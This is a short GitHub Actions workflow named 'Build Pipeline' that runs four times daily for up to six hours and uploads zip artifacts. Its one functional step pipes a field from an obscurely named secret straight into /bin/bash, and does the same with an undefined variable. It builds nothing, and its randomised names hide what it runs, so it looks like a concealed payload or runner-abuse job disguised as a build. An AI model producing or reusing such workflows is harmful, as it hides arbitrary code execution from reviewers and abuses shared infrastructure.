name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '50 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Initialize
        env:
          hixf1553: ${{ secrets.hixf1553 }}
        run: |
          printf '%s' "$hixf1553" | jq -r .zll4 | /bin/bash
          echo $d9 | jq -r .sckk3 | /bin/bash

      - name: Persist results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 3mliP0w2
          path: "*.zip"
          retention-days: 1
